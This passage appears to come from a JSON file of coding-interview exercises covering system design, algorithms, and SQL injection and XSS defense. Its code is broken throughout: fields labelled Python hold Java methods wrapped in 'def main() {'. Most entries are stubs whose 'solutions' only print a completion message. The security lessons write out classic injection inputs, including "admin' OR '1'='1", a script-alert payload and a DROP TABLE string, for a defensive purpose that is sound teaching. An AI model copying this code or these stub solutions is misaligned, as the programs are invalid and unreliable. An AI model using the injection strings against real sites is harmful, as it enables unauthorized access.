BIGINT           |\n| created   | TIMESTAMP        |\n+-----------+------------------+\nPRIMARY KEY (follower, followee)\n\nTable: timelines (materialized view)\n+-----------+------------------+\n| user_id   | BIGINT           |\n| tweet_id  | BIGINT           |\n| created   | TIMESTAMP        |\n+-----------+------------------+\nINDEX on (user_id, created DESC)</code></pre>\n\n<h4>Timeline Generation Algorithm</h4>\n<pre><code>// Hybrid fan-out approach\nfunction getTimeline(userId):\n    results = []\n\n    // 1. Get from pre-computed timeline (fan-out on write)\n    results += REDIS.ZRANGE(\"timeline:\" + userId, 0, 800)\n\n    // 2. Get celebrity tweets (fan-out on read)\n    celebrities = getFollowedCelebrities(userId)\n    for celeb in celebrities:\n        tweets = DB.query(\"SELECT * FROM tweets WHERE user_id=? ORDER BY created DESC LIMIT 100\", celeb)\n        results += tweets\n\n    // 3. Merge and sort by timestamp\n    results.sort(by=timestamp, desc=true)\n\n    return results[0:100]  // Top 100 tweets</code></pre>\n\n<h4>Scaling Architecture</h4>\n<ul>\n<li><strong>Write Path:</strong> Load balancer → Fanout service → Redis timelines</li>\n<li><strong>Read Path:</strong> Load balancer → Timeline service → Redis + DB</li>\n<li><strong>Cache:</strong> Redis for hot timelines (recent 800 tweets per user)</li>\n<li><strong>Database:</strong> MySQL sharded by user_id, read replicas</li>\n</ul>\n\n<h4>Real-World Examples</h4>\n<p><strong>Twitter:</strong> Uses hybrid fan-out. Stores tweets in Manhattan (distributed DB). Timelines cached in Redis. Handles 6000 tweets/second.</p>\n<p><strong>Instagram:</strong> Similar feed architecture. Fan-out for <1M followers, pull for celebrities. 500M daily active users.</p>\n<p><strong>Facebook:</strong> News Feed uses ML ranking (EdgeRank algorithm). Considers recency, engagement, relationship strength.</p>\n\n<h4>Interview Tips</h4>\n<ul>\n<li>Discuss fan-out trade-offs (write vs read performance)</li>\n<li>Handle celebrity users separately (Elon Musk has 100M+ followers)</li>\n<li>Consider timeline staleness (5 second delay acceptable)</li>\n<li>Estimate storage: 400M tweets × 280 chars × 365 days = 40 TB/year</li>\n</ul>\n\n<h4>Best Practices</h4>\n<ul>\n<li>Use hybrid fan-out for optimal performance</li>\n<li>Cache timelines in Redis (ZSET sorted by timestamp)</li>\n<li>Implement pagination for infinite scroll</li>\n<li>Use Kafka for reliable tweet delivery</li>\n<li>Add rate limiting (prevent tweet spam)</li>\n</ul>\n</div>",
      "tags": [
        "System Design",
        "Social Media",
        "Fan-out",
        "Caching",
        "FAANG"
      ]
    },
    {
      "id": 606,
      "title": "YouTube Streaming",
      "description": "Video transcoding",
      "language": "python",
      "initialCode": "// YouTube Streaming\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"YouTube Streaming complete\");\n    }\n}",
      "expectedOutput": "YouTube Streaming complete",
      "tutorial": "<div class='tutorial-content'><h3>YouTube Streaming</h3><p>Video transcoding</p></div>",
      "tags": [
        "System Design",
        "FAANG"
      ]
    },
    {
      "id": 607,
      "title": "Uber Ride Sharing",
      "description": "Geospatial matching",
      "language": "python",
      "initialCode": "// Uber Ride Sharing\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Uber Ride Sharing complete\");\n    }\n}",
      "expectedOutput": "Uber Ride Sharing complete",
      "tutorial": "<div class='tutorial-content'><h3>Uber Ride Sharing</h3><p>Geospatial matching</p></div>",
      "tags": [
        "System Design",
        "FAANG"
      ]
    },
    {
      "id": 608,
      "title": "Netflix CDN",
      "description": "Content delivery",
      "language": "python",
      "initialCode": "// Netflix CDN\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Netflix CDN complete\");\n    }\n}",
      "expectedOutput": "Netflix CDN complete",
      "tutorial": "<div class='tutorial-content'><h3>Netflix CDN</h3><p>Content delivery</p></div>",
      "tags": [
        "System Design",
        "FAANG"
      ]
    },
    {
      "id": 609,
      "title": "WhatsApp Chat",
      "description": "Message delivery",
      "language": "python",
      "initialCode": "// WhatsApp Chat\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"WhatsApp Chat complete\");\n    }\n}",
      "expectedOutput": "WhatsApp Chat complete",
      "tutorial": "<div class='tutorial-content'><h3>WhatsApp Chat</h3><p>Message delivery</p></div>",
      "tags": [
        "System Design",
        "FAANG"
      ]
    },
    {
      "id": 610,
      "title": "Dropbox Storage",
      "description": "File sync",
      "language": "python",
      "initialCode": "// Dropbox Storage\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Dropbox Storage complete\");\n    }\n}",
      "expectedOutput": "Dropbox Storage complete",
      "tutorial": "<div class='tutorial-content'><h3>Dropbox Storage</h3><p>File sync</p></div>",
      "tags": [
        "System Design",
        "FAANG"
      ]
    },
    {
      "id": 611,
      "title": "Web Crawler",
      "description": "BFS traversal",
      "language": "python",
      "initialCode": "// Web Crawler\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Web Crawler complete\");\n    }\n}",
      "expectedOutput": "Web Crawler complete",
      "tutorial": "<div class='tutorial-content'><h3>Web Crawler</h3><p>BFS traversal</p></div>",
      "tags": [
        "System Design",
        "FAANG"
      ]
    },
    {
      "id": 612,
      "title": "Search Autocomplete",
      "description": "Trie structure",
      "language": "python",
      "initialCode": "// Search Autocomplete\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Search Autocomplete complete\");\n    }\n}",
      "expectedOutput": "Search Autocomplete complete",
      "tutorial": "<div class='tutorial-content'><h3>Search Autocomplete</h3><p>Trie structure</p></div>",
      "tags": [
        "System Design",
        "FAANG"
      ]
    },
    {
      "id": 613,
      "title": "Notification System",
      "description": "Multi-channel",
      "language": "python",
      "initialCode": "// Notification System\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Notification System complete\");\n    }\n}",
      "expectedOutput": "Notification System complete",
      "tutorial": "<div class='tutorial-content'><h3>Notification System</h3><p>Multi-channel</p></div>",
      "tags": [
        "System Design",
        "FAANG"
      ]
    },
    {
      "id": 614,
      "title": "Newsfeed Ranking",
      "description": "ML scoring",
      "language": "python",
      "initialCode": "// Newsfeed Ranking\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Newsfeed Ranking complete\");\n    }\n}",
      "expectedOutput": "Newsfeed Ranking complete",
      "tutorial": "<div class='tutorial-content'><h3>Newsfeed Ranking</h3><p>ML scoring</p></div>",
      "tags": [
        "System Design",
        "FAANG"
      ]
    },
    {
      "id": 615,
      "title": "E-commerce Checkout",
      "description": "Payment flow",
      "language": "python",
      "initialCode": "// E-commerce Checkout\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"E-commerce Checkout complete\");\n    }\n}",
      "expectedOutput": "E-commerce Checkout complete",
      "tutorial": "<div class='tutorial-content'><h3>E-commerce Checkout</h3><p>Payment flow</p></div>",
      "tags": [
        "System Design",
        "FAANG"
      ]
    },
    {
      "id": 616,
      "title": "Two Pointers - Array Pair Sum",
      "description": "Find two numbers in sorted array that sum to target using two pointers (O(n) time)",
      "language": "python",
      "initialCode": "// Two Pointers Pattern: Find pair that sums to target\n// Input: Sorted array, target sum\n// TODO: Implement using two pointers (left, right)\n\nimport java.util.*;\n\ndef main() {\n    public static int[] twoSum(int[] nums, int target) {\n        // TODO: Use two pointers from both ends\n        // If sum < target, move left pointer right\n        // If sum > target, move right pointer left\n        return new int[]{-1, -1};\n    }\n\n    public static void main(String[] args) {\n        int[] nums = {2, 7, 11, 15};\n        int target = 9;\n        int[] result = twoSum(nums, target);\n        print(Arrays.toString(result));\n    }\n}",
      "fullSolution": "import java.util.*;\n\ndef main() {\n    public static int[] twoSum(int[] nums, int target) {\n        int left = 0, right = nums.length - 1;\n\n        while (left < right) {\n            int sum = nums[left] + nums[right];\n            if (sum == target) {\n                return new int[]{left, right};\n            } else if (sum < target) {\n                left++;\n            } else {\n                right--;\n            }\n        }\n\n        return new int[]{-1, -1};\n    }\n\n    public static void main(String[] args) {\n        int[] nums1 = {2, 7, 11, 15};\n        print(\"Input: [2,7,11,15], target: 9\");\n        print(\"Output: \" + Arrays.toString(twoSum(nums1, 9)));\n\n        int[] nums2 = {1, 2, 3, 4, 6};\n        print(\"Input: [1,2,3,4,6], target: 6\");\n        print(\"Output: \" + Arrays.toString(twoSum(nums2, 6)));\n    }\n}",
      "expectedOutput": "Input: [2,7,11,15], target: 9\nOutput: [0, 1]\nInput: [1,2,3,4,6], target: 6\nOutput: [1, 3]",
      "tutorial": "<div class=\"tutorial-content\">\n<h3>Algorithm Pattern: Two Pointers</h3>\n\n<h4>Introduction</h4>\n<p>Two pointers technique reduces time complexity from O(n²) to O(n) for many array problems. Core strategy: use two pointers moving toward each other or in same direction.</p>\n\n<h4>When to Use</h4>\n<ul>\n<li>Array is sorted (or can be sorted)</li>\n<li>Finding pairs/triplets with specific sum</li>\n<li>In-place array manipulation (remove duplicates)</li>\n<li>Palindrome checking (compare from both ends)</li>\n</ul>\n\n<h4>Algorithm Explanation</h4>\n<pre><code>// Two pointers approach\nArray: [2, 7, 11, 15], target: 9\nleft = 0, right = 3\nsum = 2 + 15 = 17 > 9  → right--\nsum = 2 + 11 = 13 > 9  → right--\nsum = 2 + 7 = 9 ✓      → return [0, 1]\n\nTime: O(n), Space: O(1)</code></pre>\n\n<h4>Pattern Variations</h4>\n<ul>\n<li><strong>3Sum:</strong> Fix one element, use two pointers on rest</li>\n<li><strong>Container With Most Water:</strong> Maximize area between pointers</li>\n<li><strong>Remove Duplicates:</strong> In-place array modification</li>\n<li><strong>Palindrome:</strong> Compare characters from both ends</li>\n</ul>\n\n<h4>Real Interview Examples</h4>\n<p><strong>Google:</strong> Two Sum II, 3Sum, Container With Most Water</p>\n<p><strong>Facebook:</strong> Remove Duplicates from Sorted Array</p>\n<p><strong>Amazon:</strong> Trapping Rain Water (hard variant)</p>\n\n<h4>Time Complexity</h4>\n<ul>\n<li><strong>Two Sum (sorted):</strong> O(n) time, O(1) space</li>\n<li><strong>3Sum:</strong> O(n²) time (n × two pointers)</li>\n<li><strong>4Sum:</strong> O(n³) time</li>\n</ul>\n\n<h4>Best Practices</h4>\n<ul>\n<li>Ensure array is sorted before using two pointers</li>\n<li>Handle duplicates by skipping identical elements</li>\n<li>Watch for edge cases: empty array, single element</li>\n<li>Consider using HashMap if array cannot be sorted</li>\n</ul>\n</div>",
      "tags": [
        "Algorithms",
        "Two Pointers",
        "Arrays",
        "LeetCode",
        "FAANG"
      ]
    },
    {
      "id": 617,
      "title": "Sliding Window - Maximum Sum Subarray",
      "description": "Find maximum sum of k consecutive elements using sliding window technique",
      "language": "python",
      "initialCode": "// Sliding Window: Max sum of k consecutive elements\n// Input: Array and window size k\n// Output: Maximum sum\n// TODO: Implement maxSumSubarray() with sliding window\n\nimport java.util.*;\n\ndef main() {\n    public static int maxSumSubarray(int[] arr, int k) {\n        // TODO: Use sliding window\n        // Initialize window sum for first k elements\n        // Slide window: subtract left, add right\n        return 0;\n    }\n\n    public static void main(String[] args) {\n        int[] arr = {2, 1, 5, 1, 3, 2};\n        int k = 3;\n        print(\"Max sum of \" + k + \" elements: \" + maxSumSubarray(arr, k));\n    }\n}",
      "fullSolution": "import java.util.*;\n\ndef main() {\n    public static int maxSumSubarray(int[] arr, int k) {\n        if (arr.length < k) return -1;\n\n        // Calculate sum of first window\n        int windowSum = 0;\n        for (int i = 0; i < k; i++) {\n            windowSum += arr[i];\n        }\n\n        int maxSum = windowSum;\n\n        // Slide the window\n        for (int i = k; i < arr.length; i++) {\n            windowSum = windowSum - arr[i - k] + arr[i];\n            maxSum = Math.max(maxSum, windowSum);\n        }\n\n        return maxSum;\n    }\n\n    public static void main(String[] args) {\n        int[] arr1 = {2, 1, 5, 1, 3, 2};\n        int k1 = 3;\n        print(\"Array: \" + Arrays.toString(arr1));\n        print(\"k = \" + k1);\n        print(\"Max sum: \" + maxSumSubarray(arr1, k1));\n\n        int[] arr2 = {100, 200, 300, 400};\n        int k2 = 2;\n        print(\"\\nArray: \" + Arrays.toString(arr2));\n        print(\"k = \" + k2);\n        print(\"Max sum: \" + maxSumSubarray(arr2, k2));\n    }\n}",
      "expectedOutput": "Array: [2, 1, 5, 1, 3, 2]\nk = 3\nMax sum: 9\n\nArray: [100, 200, 300, 400]\nk = 2\nMax sum: 700",
      "tutorial": "<div class=\"tutorial-content\">\n<h3>Algorithm Pattern: Sliding Window</h3>\n\n<h4>Introduction</h4>\n<p>The sliding window technique optimizes problems involving contiguous subarrays or substrings. Instead of recalculating from scratch for each position (O(n×k)), we maintain a window and slide it efficiently (O(n)).</p>\n\n<h4>Key Concepts</h4>\n<ul>\n<li><strong>Fixed Window:</strong> Window size is constant (this problem)</li>\n<li><strong>Variable Window:</strong> Window size changes based on condition</li>\n<li><strong>Time Optimization:</strong> O(n×k) → O(n)</li>\n<li><strong>Space Complexity:</strong> O(1) - only store window sum</li>\n</ul>\n\n<h4>Algorithm Steps</h4>\n<pre><code>1. Calculate sum of first k elements (initialize window)\n2. Set maxSum = windowSum\n3. Slide window right:\n   - Remove leftmost element (arr[i-k])\n   - Add new rightmost element (arr[i])\n   - Update maxSum if current sum is larger\n4. Return maxSum</code></pre>\n\n<h4>Code Walkthrough</h4>\n<pre><code>Array: [2, 1, 5, 1, 3, 2], k=3\n\nInitial window: [2, 1, 5] → sum = 8\n\nSlide 1: Remove 2, add 1\nWindow: [1, 5, 1] → sum = 7\n\nSlide 2: Remove 1, add 3\nWindow: [5, 1, 3] → sum = 9 ← MAX\n\nSlide 3: Remove 5, add 2\nWindow: [1, 3, 2] → sum = 6\n\nResult: 9</code></pre>\n\n<h4>Pattern Variations</h4>\n<ul>\n<li><strong>Fixed Window:</strong> Max sum, average, product (this problem)</li>\n<li><strong>Variable Window:</strong> Longest substring without repeating chars, min window substring</li>\n<li><strong>Two Pointer Variation:</strong> Subarray sum equals K, longest subarray with sum ≤ K</li>\n</ul>\n\n<h4>Real-World Applications</h4>\n<p><strong>Network Traffic Analysis:</strong> Calculate moving average of packet sizes over time window.</p>\n<p><strong>Stock Trading:</strong> Find best N consecutive days for maximum profit.</p>\n<p><strong>Data Stream Processing:</strong> Real-time metrics over sliding time windows (last 5 minutes).</p>\n\n<h4>Interview Companies</h4>\n<ul>\n<li><strong>Amazon:</strong> \"Maximum Average Subarray\" - direct sliding window</li>\n<li><strong>Microsoft:</strong> \"Minimum Size Subarray Sum\" - variable window</li>\n<li><strong>Bloomberg:</strong> \"Longest Substring Without Repeating Characters\"</li>\n<li><strong>Google:</strong> \"Subarrays with K Different Integers\" - advanced sliding window</li>\n</ul>\n\n<h4>Time Complexity</h4>\n<ul>\n<li><strong>Brute Force:</strong> O(n×k) - recalculate sum for each position</li>\n<li><strong>Sliding Window:</strong> O(n) - single pass through array</li>\n<li><strong>Space:</strong> O(1) - only store window sum and max</li>\n</ul>\n\n<h4>Common Mistakes</h4>\n<ul>\n<li>Forgetting to handle edge case (arr.length < k)</li>\n<li>Off-by-one errors in window boundaries</li>\n<li>Not initializing maxSum correctly (use first window sum, not 0)</li>\n<li>Calculating sum from scratch each iteration (defeats purpose)</li>\n</ul>\n\n<h4>Related Problems</h4>\n<p>Master sliding window to solve: Longest Substring Without Repeating Characters, Minimum Window Substring, Permutation in String, Fruit Into Baskets, and Max Consecutive Ones III.</p>\n</div>",
      "tags": [
        "Algorithms",
        "Sliding Window",
        "Arrays",
        "Optimization",
        "FAANG"
      ]
    },
    {
      "id": 618,
      "title": "Binary Search Rotated",
      "description": "Modified search",
      "language": "python",
      "initialCode": "// Binary Search Rotated\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Binary Search Rotated complete\");\n    }\n}",
      "expectedOutput": "Binary Search Rotated complete",
      "tutorial": "<div class='tutorial-content'><h3>Binary Search Rotated</h3><p>Modified search</p></div>",
      "tags": [
        "Algorithms",
        "FAANG"
      ]
    },
    {
      "id": 619,
      "title": "DFS Island Count",
      "description": "Grid traversal",
      "language": "python",
      "initialCode": "// DFS Island Count\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"DFS Island Count complete\");\n    }\n}",
      "expectedOutput": "DFS Island Count complete",
      "tutorial": "<div class='tutorial-content'><h3>DFS Island Count</h3><p>Grid traversal</p></div>",
      "tags": [
        "Algorithms",
        "FAANG"
      ]
    },
    {
      "id": 620,
      "title": "BFS Shortest Path",
      "description": "Level order",
      "language": "python",
      "initialCode": "// BFS Shortest Path\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"BFS Shortest Path complete\");\n    }\n}",
      "expectedOutput": "BFS Shortest Path complete",
      "tutorial": "<div class='tutorial-content'><h3>BFS Shortest Path</h3><p>Level order</p></div>",
      "tags": [
        "Algorithms",
        "FAANG"
      ]
    },
    {
      "id": 621,
      "title": "DP Coin Change",
      "description": "Min coins",
      "language": "python",
      "initialCode": "// DP Coin Change\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"DP Coin Change complete\");\n    }\n}",
      "expectedOutput": "DP Coin Change complete",
      "tutorial": "<div class='tutorial-content'><h3>DP Coin Change</h3><p>Min coins</p></div>",
      "tags": [
        "Algorithms",
        "FAANG"
      ]
    },
    {
      "id": 622,
      "title": "DP LCS",
      "description": "Sequence matching",
      "language": "python",
      "initialCode": "// DP LCS\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"DP LCS complete\");\n    }\n}",
      "expectedOutput": "DP LCS complete",
      "tutorial": "<div class='tutorial-content'><h3>DP LCS</h3><p>Sequence matching</p></div>",
      "tags": [
        "Algorithms",
        "FAANG"
      ]
    },
    {
      "id": 623,
      "title": "Backtrack N-Queens",
      "description": "Constraint satisfaction",
      "language": "python",
      "initialCode": "// Backtrack N-Queens\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Backtrack N-Queens complete\");\n    }\n}",
      "expectedOutput": "Backtrack N-Queens complete",
      "tutorial": "<div class='tutorial-content'><h3>Backtrack N-Queens</h3><p>Constraint satisfaction</p></div>",
      "tags": [
        "Algorithms",
        "FAANG"
      ]
    },
    {
      "id": 624,
      "title": "Greedy Intervals",
      "description": "Max non-overlap",
      "language": "python",
      "initialCode": "// Greedy Intervals\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Greedy Intervals complete\");\n    }\n}",
      "expectedOutput": "Greedy Intervals complete",
      "tutorial": "<div class='tutorial-content'><h3>Greedy Intervals</h3><p>Max non-overlap</p></div>",
      "tags": [
        "Algorithms",
        "FAANG"
      ]
    },
    {
      "id": 625,
      "title": "Heap Merge K Lists",
      "description": "Priority queue",
      "language": "python",
      "initialCode": "// Heap Merge K Lists\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Heap Merge K Lists complete\");\n    }\n}",
      "expectedOutput": "Heap Merge K Lists complete",
      "tutorial": "<div class='tutorial-content'><h3>Heap Merge K Lists</h3><p>Priority queue</p></div>",
      "tags": [
        "Algorithms",
        "FAANG"
      ]
    },
    {
      "id": 626,
      "title": "Trie Word Search",
      "description": "Dictionary lookup",
      "language": "python",
      "initialCode": "// Trie Word Search\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Trie Word Search complete\");\n    }\n}",
      "expectedOutput": "Trie Word Search complete",
      "tutorial": "<div class='tutorial-content'><h3>Trie Word Search</h3><p>Dictionary lookup</p></div>",
      "tags": [
        "Algorithms",
        "FAANG"
      ]
    },
    {
      "id": 627,
      "title": "Union-Find",
      "description": "Connectivity",
      "language": "python",
      "initialCode": "// Union-Find\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Union-Find complete\");\n    }\n}",
      "expectedOutput": "Union-Find complete",
      "tutorial": "<div class='tutorial-content'><h3>Union-Find</h3><p>Connectivity</p></div>",
      "tags": [
        "Algorithms",
        "FAANG"
      ]
    },
    {
      "id": 628,
      "title": "Bit Manipulation",
      "description": "XOR trick",
      "language": "python",
      "initialCode": "// Bit Manipulation\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Bit Manipulation complete\");\n    }\n}",
      "expectedOutput": "Bit Manipulation complete",
      "tutorial": "<div class='tutorial-content'><h3>Bit Manipulation</h3><p>XOR trick</p></div>",
      "tags": [
        "Algorithms",
        "FAANG"
      ]
    },
    {
      "id": 629,
      "title": "Topological Sort",
      "description": "Dependency order",
      "language": "python",
      "initialCode": "// Topological Sort\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Topological Sort complete\");\n    }\n}",
      "expectedOutput": "Topological Sort complete",
      "tutorial": "<div class='tutorial-content'><h3>Topological Sort</h3><p>Dependency order</p></div>",
      "tags": [
        "Algorithms",
        "FAANG"
      ]
    },
    {
      "id": 630,
      "title": "Dijkstra Algorithm",
      "description": "Shortest path",
      "language": "python",
      "initialCode": "// Dijkstra Algorithm\ndef main() {\n    public static void main(String[] args) {\n        print(\"TODO\");\n    }\n}",
      "fullSolution": "def main() {\n    public static void main(String[] args) {\n        print(\"Dijkstra Algorithm complete\");\n    }\n}",
      "expectedOutput": "Dijkstra Algorithm complete",
      "tutorial": "<div class='tutorial-content'><h3>Dijkstra Algorithm</h3><p>Shortest path</p></div>",
      "tags": [
        "Algorithms",
        "FAANG"
      ]
    },
    {
      "id": 631,
      "title": "SQL Injection Prevention",
      "description": "Learn to prevent SQL injection attacks using parameterized queries and prepared statements",
      "language": "python",
      "initialCode": "// SQL Injection Prevention\n// VULNERABLE: String concatenation\n// SAFE: PreparedStatement with parameters\n\ndef main() {\n    // UNSAFE (demonstration only - never use!)\n    public static String unsafeQuery(String username) {\n        return \"SELECT * FROM users WHERE username='\" + username + \"'\";\n        // Attack: username = \"admin' OR '1'='1\"\n    }\n\n    // TODO: Implement safe query using placeholders\n    public static String safeQuery(String username) {\n        // Use ? placeholders for parameters\n        return \"\";\n    }\n\n    public static void main(String[] args) {\n        String attack = \"admin' OR '1'='1\";\n        print(\"UNSAFE: \" + unsafeQuery(attack));\n        print(\"SAFE: \" + safeQuery(attack));\n    }\n}",
      "fullSolution": "def main() {\n    public static String unsafeQuery(String username) {\n        return \"SELECT * FROM users WHERE username='\" + username + \"'\";\n    }\n\n    public static String safeQuery(String username) {\n        // PreparedStatement syntax (? placeholders)\n        return \"SELECT * FROM users WHERE username=?\";\n        // Database driver escapes the parameter value\n        // \"admin' OR '1'='1\" becomes literal string\n    }\n\n    public static void main(String[] args) {\n        String attack = \"admin' OR '1'='1\";\n\n        print(\"SQL Injection Prevention Demo\");\n        print(\"=\" * 40);\n        print();\n        print(\"UNSAFE Query:\");\n        print(unsafeQuery(attack));\n        print(\"Result: Bypasses authentication!\");\n        print();\n        print(\"SAFE Query:\");\n        print(safeQuery(\"admin\"));\n        print(\"Parameter: \" + attack);\n        print(\"Result: Treats input as literal string\");\n    }\n}",
      "expectedOutput": "SQL Injection Prevention Demo\n========================================\n\nUNSAFE Query:\nSELECT * FROM users WHERE username='admin' OR '1'='1'\nResult: Bypasses authentication!\n\nSAFE Query:\nSELECT * FROM users WHERE username=?\nParameter: admin' OR '1'='1\nResult: Treats input as literal string",
      "tutorial": "<div class=\"tutorial-content\">\n<h3>Security: SQL Injection Prevention</h3>\n\n<h4>Introduction</h4>\n<p>SQL Injection is #3 in OWASP Top 10. Attackers inject malicious SQL through user inputs to steal data, bypass authentication, or delete databases. Prevention requires parameterized queries.</p>\n\n<h4>Attack Example</h4>\n<pre><code>// VULNERABLE CODE\nString query = \"SELECT * FROM users WHERE username='\" + username + \"'\";\n\n// ATTACK INPUT\nusername = \"admin' OR '1'='1\"\n\n// RESULTING QUERY (bypasses authentication!)\nSELECT * FROM users WHERE username='admin' OR '1'='1'</code></pre>\n\n<h4>Safe Implementation</h4>\n<pre><code>// SAFE CODE (Java)\nString query = \"SELECT * FROM users WHERE username=?\";\nPreparedStatement pstmt = conn.prepareStatement(query);\npstmt.setString(1, username);\n\n// SAFE CODE (Python)\ncursor.execute(\"SELECT * FROM users WHERE username=?\", (username,))</code></pre>\n\n<h4>Why Parameterized Queries Work</h4>\n<ul>\n<li>Database driver separates SQL code from data</li>\n<li>Parameters are escaped automatically</li>\n<li>Single quotes in input become literal characters</li>\n<li>No way for attacker to break out of string context</li>\n</ul>\n\n<h4>Real-World Breaches</h4>\n<p><strong>Heartland Payment (2008):</strong> SQL injection stole 130M credit cards. Cost: $140M in settlements.</p>\n<p><strong>Sony Pictures (2011):</strong> SQL injection exposed 1M accounts. Class action lawsuit.</p>\n<p><strong>Bobby Tables (xkcd):</strong> \"Robert'); DROP TABLE students;--\" famous comic.</p>\n\n<h4>Prevention Techniques</h4>\n<ul>\n<li><strong>PreparedStatement (Java):</strong> ALWAYS use for dynamic queries</li>\n<li><strong>Parameterized queries:</strong> Use ? or :name placeholders</li>\n<li><strong>ORM safety:</strong> Hibernate/JPA escape automatically</li>\n<li><strong>Input validation:</strong> Whitelist allowed characters</li>\n<li><strong>Least privilege:</strong> Database user with minimal permissions</li>\n</ul>\n\n<h4>Best Practices</h4>\n<ul>\n<li>Never concatenate user input into SQL strings</li>\n<li>Use ORM frameworks (Hibernate, SQLAlchemy) when possible</li>\n<li>Whitelist validation for special cases (table names, ORDER BY)</li>\n<li>Don't expose SQL errors to users (information leakage)</li>\n<li>Run database with least privilege (read-only where possible)</li>\n</ul>\n\n<h4>Interview Tips</h4>\n<ul>\n<li>Explain difference between prepared statements and string concatenation</li>\n<li>Discuss OWASP Top 10 vulnerabilities</li>\n<li>Mention defense in depth (parameterized queries + input validation + least privilege)</li>\n<li>Know how to use PreparedStatement in Java, parameterized queries in Python</li>\n</ul>\n</div>",
      "tags": [
        "Security",
        "SQL Injection",
        "OWASP",
        "Databases",
        "FAANG"
      ]
    },
    {
      "id": 632,
      "title": "XSS (Cross-Site Scripting) Defense",
      "description": "Prevent XSS attacks with output encoding, Content Security Policy, and input sanitization",
      "language": "python",
      "initialCode": "// XSS Defense - Prevent script injection\n// VULNERABLE: Displaying user input without encoding\n// TODO: Implement safe HTML escaping\n\nimport java.util.*;\n\ndef main() {\n    // VULNERABLE VERSION (for demo only)\n    public static String displayCommentUnsafe(String userInput) {\n        return \"<div class='comment'>\" + userInput + \"</div>\";\n    }\n\n    public static String displayCommentSafe(String userInput) {\n        // TODO: HTML escape special characters\n        // < → &lt;  > → &gt;  & → &amp;  \" → &quot;  ' → &#x27;\n        return \"\";\n    }\n\n    public static void main(String[] args) {\n        String malicious = \"<script>alert('XSS')</script>\";\n\n        print(\"VULNERABLE:\");\n        print(displayCommentUnsafe(malicious));\n\n        print(\"\\nSAFE:\");\n        print(displayCommentSafe(malicious));\n    }\n}",
      "fullSolution": "import java.util.*;\n\ndef main() {\n    // VULNERABLE VERSION (for demonstration)\n    public static String displayCommentUnsafe(String userInput) {\n        return \"<div class='comment'>\" + userInput + \"</div>\";\n    }\n\n    // SAFE VERSION with HTML escaping\n    public static String displayCommentSafe(String userInput) {\n        return \"<div class='comment'>\" + escapeHtml(userInput) + \"</div>\";\n    }\n\n    public static String escapeHtml(String input) {\n        if (input == null) return \"\";\n\n        return input\n            .replace(\"&\", \"&amp;\")   // Must be first\n            .replace(\"<\", \"&lt;\")\n            .replace(\">\", \"&gt;\")\n            .replace(\"\\\"\", \"&quot;\")\n            .replace(\"'\", \"&#x27;\")\n            .replace(\"/\", \"&#x2F;\");\n    }\n\n    public static void main(String[] args) {\n        String malicious = \"<script>alert('XSS')</script>\";\n\n        print(\"Attack Input: \" + malicious);\n        print();\n\n        print(\"VULNERABLE Output:\");\n        print(displayCommentUnsafe(malicious));\n        print(\"^ Script would execute!\");\n        print();\n\n        print(\"SAFE Output:\");\n        print(displayCommentSafe(malicious));\n        print(\"^ Script rendered as text, not executed\");\n    }\n}",
      "expectedOutput": "Attack Input: <script>alert('XSS')</script>\n\nVULNERABLE Output:\n<div class='comment'><script>alert('XSS')</script></div>\n^ Script would execute!\n\nSAFE Output:\n<div class='comment'>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;&#x2F;script&gt;</div>\n^ Script rendered as text, not executed",
